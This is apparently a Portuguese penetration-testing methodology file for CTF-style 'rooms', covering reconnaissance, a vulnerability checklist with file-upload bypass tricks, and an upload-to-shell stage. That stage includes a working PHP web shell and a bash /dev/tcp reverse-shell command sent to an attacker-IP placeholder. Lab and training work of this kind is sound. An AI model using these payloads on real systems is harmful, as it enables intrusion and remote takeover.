# Metodologia de investigação

Convenção a seguir sempre que se testa uma room ou projeto novo. Objetivo: nunca saltar etapas e manter tudo registado num documento de investigação por alvo.

## Etapa 1 — Reconhecimento

1. **Nmap** — `nmap -sCV <IP_ALVO>`
   Descobre portas abertas, versões de serviços, e normalmente já revela também bases de dados e outras aplicações a correr (ex.: MySQL, Redis, SMB, etc.). Tudo o que aparecer aqui vai para o documento de investigação, não só o serviço web.

2. **Visualização manual + curl**
   Abrir no navegador o(s) serviço(s) HTTP encontrados. Em paralelo, `curl -I` / `curl -v` para ver headers, banners e redirects que o navegador esconde.

3. **Criar/atualizar o documento de investigação**
   Depois do nmap e da inspeção manual, registar tudo o que já se sabe (ver template abaixo).

4. **Directory Enumeration** — `ffuf` / `gobuster`
   Procurar diretórios e ficheiros escondidos. Atualizar o documento de investigação com o que for encontrado (novas rotas, ficheiros de config, painéis, etc.).

5. **Procurar API e endpoints**
   Verificar se existe API (`/api`, `/graphql`, Swagger/OpenAPI, etc.) e mapear os endpoints encontrados.

6. **Atualizar o documento de investigação continuamente**
   Cada nova descoberta (vulnerabilidade, credencial, versão, endpoint) entra no documento assim que é confirmada — não só no fim.

## Etapa 2 — Busca de falhas

Com a superfície mapeada (endpoints, rotas, parâmetros), testar sistematicamente uma classe de falha de cada vez, começando pela mais provável dado o que foi encontrado na Etapa 1. Para cada endpoint/parâmetro com IDs, sessões ou input do utilizador, verificar pelo menos:

1. **IDOR** — trocar IDs/referências (ex.: `?id=1` → `?id=2`, ou o ID de outro utilizador) e ver se dá acesso a dados que não deviam ser teus.
2. **Autenticação / controlo de acesso** — aceder a rotas autenticadas sem sessão, ou com sessão de outro perfil (ex.: user vs admin).
3. **Injeção (SQLi/Command Injection)** — parâmetros que entram em queries ou comandos do sistema.
4. **XSS** — inputs refletidos ou armazenados sem sanitização.
5. **LFI/RFI/Path Traversal** — parâmetros que apontam para ficheiros (`?file=`, `?page=`).
6. **SSRF** — parâmetros que fazem o servidor pedir uma URL.
7. **Exposição de ficheiros/segredos** — `.env`, `.git`, backups, ficheiros de config acessíveis diretamente.
8. **Fluxo de reset de senha** — uma das features mais frequentemente mal implementadas, porque é complexa e os devs costumam cortar caminho. Verificar:
   - o token de reset é previsível, sequencial, ou reutilizável após já ter sido usado?
   - o token expira? consegue ser usado depois de expirado ou depois de já ter sido consumido?
   - o endpoint aceita trocar o e-mail/username do request para resetar a senha de outro utilizador (IDOR no próprio fluxo)?
   - a resposta do "esqueci a senha" diferencia utilizador existente vs inexistente (user enumeration)?
   - falta rate limiting no envio de tokens ou na tentativa de adivinhar o token?
   - o token vaza (URL no Referer, log, resposta da API, link por HTTP em vez de HTTPS)?
   - a sessão antiga continua válida depois do reset (não invalida sessões existentes)?
9. **Upload de ficheiros** — uma feature poderosa (ainda mais em painel de admin) e caminho comum para RCE. Verificar:
   - a restrição de tipo é só client-side? (atributo `accept` do `<input>`, validação em JS) — remover/editar no DevTools ou mandar o pedido direto (Burp/curl) e ver se o servidor aceita mesmo assim.
   - qual o caminho de destino do upload (ex.: `/uploads/documents/`)? os ficheiros lá ficam acessíveis diretamente e são executados pelo servidor?
   - a validação do servidor é por extensão (blocklist) ou por conteúdo (magic bytes/MIME real)? testar extensão claramente perigosa primeiro (`.php`) para confirmar se há blocklist.
   - se `.php` for bloqueado, tentar extensões alternativas que o Apache/servidor ainda processa como código: `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.inc`, `.asp`/`.aspx`/`.asa` (IIS), `.jsp`/`.jspx` (Tomcat), conforme a stack identificada no nmap.
   - outros bypasses a testar: double extension (`shell.php.jpg`), null byte (`shell.php%00.jpg`), maiúsculas (`shell.PHP`), content-type do multipart forjado, magic bytes de imagem + payload PHP no fim do ficheiro (polyglot).
   - depois de um upload aceite, confirmar execução visitando o ficheiro diretamente no caminho de destino (ex.: `/uploads/documents/test.phtml`).
   - payloads prontos para este teste em [tools-general/upload-bypass/](tools-general/upload-bypass/) (`test.txt`, `phpinfo.phtml`, `shell.phtml`).

Cada falha testada (encontrada ou não) fica registada na secção "Testes de falhas" do documento de investigação, para não repetir trabalho nem esquecer o que já foi tentado.

## Etapa 3 — De upload a shell interativa

Quando o bypass de upload (item 9 da Etapa 2) confirmar execução de código, o passo seguinte é consolidar isso numa shell interativa:

1. **Web shell** — subir um ficheiro pequeno que executa comandos via parâmetro HTTP, usando a mesma extensão que passou no bypass (ex.: `.phtml`). Já existe pronto em [tools-general/upload-bypass/shell.phtml](tools-general/upload-bypass/shell.phtml):
   ```php
   <?php
   if(isset($_GET['cmd'])) {
       echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
   }
   ?>
   ```
   Para confirmar execução sem já lançar comandos, usar antes [tools-general/upload-bypass/phpinfo.phtml](tools-general/upload-bypass/phpinfo.phtml).

2. **Confirmar RCE** — chamar o ficheiro no caminho de upload com comandos básicos:
   ```bash
   curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=whoami"
   curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=id"
   curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=hostname"
   curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=uname+-a"
   ```

3. **Enumeração inicial via web shell** — ler ficheiros sensíveis antes de escalar para shell interativa (ex.: `/etc/passwd` para listar utilizadores, ficheiros de config da app para credenciais de BD).

4. **Reverse shell** — o web shell é limitado (um comando por request, sem sessão interativa, caracteres especiais complicam). Escalar para reverse shell:
   - Listener no atacante: `nc -lvnp 4444`
   - Payload via web shell (URL-encoded para evitar problemas com caracteres especiais):
     ```bash
     curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<IP_ATACANTE>/4444+0>%261'"
     ```
   - Confirmar a shell interativa recebida no listener (`whoami`, `id`).

5. **Registar no documento de investigação**: caminho do web shell, comandos confirmados, utilizador obtido (tipicamente `www-data`/`apache`, sem privilégios), e ficheiros sensíveis já lidos. A escalada de privilégios a partir daqui fica para uma etapa própria, fora do âmbito desta.

## Documento de investigação

Um ficheiro `investigacao.md` por room/projeto, em `room/<nome>/investigacao.md`, com esta estrutura mínima:

```markdown
# Investigação — <nome da room>

## Alvo
- IP:
- Domínio(s):

## Portas e serviços (nmap)
| Porta | Serviço | Versão |
|-------|---------|--------|
|       |         |        |

## Bases de dados / outras aplicações
-

## Servidores web
- Servidor:
- Versão:
- Headers relevantes:

## Directory enumeration
-

## API / Endpoints
-

## Testes de falhas (Etapa 2)
| Tipo | Onde foi testado | Resultado |
|------|-------------------|-----------|
| IDOR |                   |           |
| Reset de senha |             |           |
| Upload de ficheiros |       |           |

## Shell / RCE (Etapa 3)
- Web shell (caminho):
- Comandos confirmados:
- Utilizador obtido:
- Reverse shell (IP:porta):
- Ficheiros sensíveis lidos:

## Vulnerabilidades identificadas
-

## Credenciais / segredos encontrados
-

## Próximos passos
-
```

Ver [CLAUDE.md](CLAUDE.md) para a estrutura geral do repositório e convenções dos scripts.
